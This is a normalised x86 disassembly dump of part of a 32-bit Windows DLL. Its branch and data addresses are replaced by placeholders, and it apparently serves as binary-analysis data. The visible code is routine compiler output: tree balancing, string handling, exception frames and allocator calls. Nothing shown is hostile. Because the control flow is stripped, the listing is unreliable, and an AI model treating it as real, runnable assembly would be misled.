mov eax [ ecx + 0x8 ]
cmp [ eax + 0x10 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x10 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x10 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x10 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x10 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x10 ] bl
je r-xdata
mov al [ esi + 0x10 ]
mov [ ecx + 0x10 ] al
mov [ esi + 0x10 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x10 ] bl
push edx
mov ecx esi
call sub_100055b0
mov eax [ ecx + 0x8 ]
mov [ eax + 0x10 ] bl
push edx
mov [ ecx + 0x10 ] 0x0
call sub_10005550
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] 0x0
mov al [ esi + 0x10 ]
mov [ ecx + 0x10 ] al
mov [ esi + 0x10 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x10 ] bl
push edx
mov ecx esi
call sub_10005550
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x10 ] bl
push edx
mov [ ecx + 0x10 ] 0x0
call sub_100055b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_100020d0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10012808
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10013848
lea eax [ ecx * 8 ]
push eax
call sub_10012ca7
add esp 0x4
test eax eax
jne r-xdata
sub_10002130
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x3ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_10012c4b
add esp 0x4
push r--data
call sub_100126ab
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x10 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x10 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x10 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x10 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x10 ] 0x1
mov [ esi + 0x10 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x10 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x10 ] 0x1
mov [ esi + 0x10 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x10 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x10 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x10 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x11 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x11 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x10 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x10 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x10 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x11 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x11 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_10002350
push ebp
mov ebp esp
sub esp 0xc
push 0x14
call sub_10012ca7
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] edx
call sub_10012808
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_10013848
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x10 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
mov [ ecx ] edx
sub_100023c0
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x8
add eax 0x8
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
pop esi
sub_10002420
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c870
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
push 0x10
mov [ edi ] r--data
call sub_10012ca7
add esp 0x4
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jmp r-xdata
xor eax eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
jmp r-xdata
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
push 0xc
mov [ edi ] r--data
mov [ edi + 0x8 ] esi
call sub_10012ca7
add esp 0x4
cmp eax esi
je r-xdata
mov esi [ edi + 0x4 ]
push eax
call sub_10004e90
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100024c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c870
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
push 0x10
mov [ edi ] r--data
call sub_10012ca7
add esp 0x4
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jmp r-xdata
xor eax eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
jmp r-xdata
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
push 0xc
mov [ edi ] r--data
call sub_10012ca7
add esp 0x4
cmp eax esi
je r-xdata
mov esi [ edi + 0x4 ]
push eax
call sub_10004e90
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10002560
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c258
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call sub_10001140
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100025d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c838
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_10001140
sub_10002630
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ esi + 0x28 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx + 0x30 ]
mov ecx esi
call eax
add esi 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebx ]
push edi
push eax
mov eax [ edx + 0x24 ]
mov ecx ebx
call eax
mov eax edi
xor ecx ecx
call sub_10002b40
mov esi [ ebp + 0x8 ]
sub_10002690
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cb4b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ esi ]
mov edi eax
mov eax [ edx + 0x8 ]
push 0x0
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
mov ebx eax
mov eax [ edx + 0x4 ]
push esi
call eax
push 0x2c
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi + 0x8 ]
mov [ esi + 0x28 ] 0x0
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
push esi
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x28 ]
mov edx [ esi + 0x8 ]
push edi
push ebx
push ecx
push edx
push eax
call sub_10002ee0
sub_10002740
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d035
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10001220
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] eax
mov [ esi + 0xc ] al
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x1
mov ecx esi
call eax
mov edx [ edi ]
push eax
mov eax [ edx + 0xc ]
push ebx
mov ecx edi
call eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov [ esi + 0x28 ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
push r--data
lea eax [ ebp + 0xc ]
push eax
mov [ ebp + 0xc ] 0x20005
call sub_10013848
sub_100027e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002990
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10002810
push ebp
mov ebp esp
mov eax 0x4008
call sub_1001a280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi ecx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
test eax eax
je r-xdata
sub eax 0x2
jne r-xdata
mov [ ebp - 0x4008 ] 0x0
mov eax [ ebp - 0x4008 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4008 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ eax + 0xc ]
mov ecx ebx
call edx
test eax eax
je r-xdata
mov ecx [ edi + 0x28 ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
push esi
push eax
lea eax [ ebp - 0x4004 ]
push eax
call edx
mov esi eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp eax 0x2
jne r-xdata
mov edx [ eax ]
mov edx [ edx + 0x20 ]
push 0x4000
lea ecx [ ebp - 0x4004 ]
push ecx
mov ecx eax
call edx
test eax eax
je r-xdata
xor eax eax
push edi
mov ebx eax
call sub_10002630
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
push edi
mov ebx eax
call sub_10002630
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
push eax
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
lea ecx [ edi + 0xc ]
call sub_10002a60
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
mov ebx [ ebp - 0x4008 ]
push edi
call sub_10002630
pop esi
mov eax [ ebx ]
mov edx [ eax + 0x4 ]
push 0x3
mov ecx ebx
call edx
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
push edi
call edx
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
sub_10002990
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cb1d
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x28 ]
test ecx ecx
je r-xdata
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_10001140
sub_10002a60
push ebp
mov ebp esp
push ebx
mov ebx eax
push edi
mov edi ecx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
mov esi [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx esi
cmp ecx eax
ja r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test eax eax
je r-xdata
push r--data
call sub_100126ab
mov eax edi
mov eax [ edi ]
jmp r-xdata
pop esi
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x4
add esi eax
mov eax edi
call sub_10002c50
test al al
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov edx [ edi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax edi
mov [ eax + esi ] 0x0
mov eax [ edi ]
mov [ eax + esi ] 0x0
pop esi
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edi + 0x10 ]
push edx
add ecx eax
push ebx
push ecx
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] esi
jb r-xdata
mov eax edi
sub ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
call sub_10002bb0
pop edi
pop ebx
pop ebp
retn 0x4
mov eax [ edi ]
sub ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
call sub_10002bb0
pop edi
pop ebx
pop ebp
retn 0x4
sub_10002b40
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_100126f8
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
mov eax esi
pop edi
retn
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_100128c0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_10002bb0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_100126f8
mov eax [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_100126ab
mov eax edi
pop ebx
pop ebp
retn 0x8
push esi
lea esi [ eax + ebx ]
mov eax edi
call sub_10002c50
test al al
je r-xdata
pop esi
mov ecx [ ebp + 0x8 ]
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov [ eax + esi ] 0x0
mov eax [ edi ]
mov [ eax + esi ] 0x0
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ edi + 0x10 ]
add ecx eax
push ecx
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10002c50
cmp esi 0xfffffffe
jbe r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
push r--data
call sub_100126ab
test esi esi
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push esi
push eax
call sub_10002ca0
xor edx edx
cmp edx esi
sbb eax eax
neg eax
retn
xor edx edx
cmp edx esi
sbb eax eax
neg eax
retn
mov [ eax + 0x10 ] esi
cmp ecx 0x10
jb r-xdata
mov [ eax ] 0x0
mov eax [ eax ]
sub_10002ca0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c590
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x0
call sub_10012808
push r--data
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] r--data
call sub_10013848
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x2
call sub_10002e10
mov [ ebp + 0xc ] eax
mov eax r-xdata
retn
push ecx
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
call sub_10018b70
add esp 0xc
sub_10002dd4
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10013848
int3
mov edx [ esi ]
push edx
call sub_10012c4b
add esp 0x4
sub_10002e10
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10012808
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10013848
push ecx
call sub_10012ca7
add esp 0x4
test eax eax
jne r-xdata
sub_10002e60
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x1c ]
jmp eax
sub_10002e90
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push edi
push 0x0
mov ecx esi
call edx
mov ecx [ esi + 0x8 ]
mov edi [ ecx ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
push 0x3
call eax
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x18 ]
push eax
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
mov ecx esi
call edx
mov ecx [ esi + 0x8 ]
mov edi [ ecx ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
push 0x3
call eax
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x18 ]
push eax
call edx
pop edi
retn
sub_10002ee0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cae5
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push eax
push esi
call sub_10001220
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x10 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
mov [ esi + 0xc ] ecx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
test edx edx
jne r-xdata
mov eax [ ecx ]
xor eax eax
jmp r-xdata
mov ecx [ ecx + 0x4 ]
xor ecx ecx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push eax
mov eax [ ebp + 0x14 ]
push eax
call edx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
sub eax ecx
sar eax 0x2
cmp eax 0x1
ja r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_10002fa0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10003040
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10002fd0
cmp [ ecx + 0x20 ] 0x0
jbe r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ eax ]
